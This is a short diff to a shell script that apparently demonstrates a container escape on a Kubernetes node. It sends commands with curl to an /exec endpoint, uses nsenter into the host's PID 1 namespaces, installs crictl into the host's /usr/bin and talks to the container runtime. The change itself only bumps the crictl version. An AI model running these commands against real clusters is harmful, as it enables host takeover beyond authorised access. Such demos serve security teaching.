@@ -20,8 +20,8 @@ curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y ins
 
 echo "4. Break out of our Linux namespace to the host's with nsenter and install crictl in /usr/bin"
 ARCH=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
-curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.26.1/crictl-v1.26.1-linux-$ARCH.tar.gz"
-curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.26.1-linux-$ARCH.tar.gz -C /usr/bin"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.31.1/crictl-v1.31.1-linux-$ARCH.tar.gz"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.31.1-linux-$ARCH.tar.gz -C /usr/bin"
 
 echo "5. Break out of our Linux namespace to the host's with nsenter and talk directly to the container runtime"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'
